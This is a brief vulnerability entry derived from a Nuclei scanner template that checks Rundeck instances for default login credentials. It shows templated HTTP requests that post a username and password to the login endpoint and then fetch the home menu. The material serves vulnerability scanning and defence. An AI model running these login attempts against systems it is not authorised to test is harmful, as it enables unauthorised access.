# Vulnerability: Rundeck - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`rundeck-default-login.yaml`)

## Description
Rundeck default login was discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

j_username={{username}}&j_password={{password}}

GET /menu/home HTTP/1.1
Host: {{Hostname}}
```

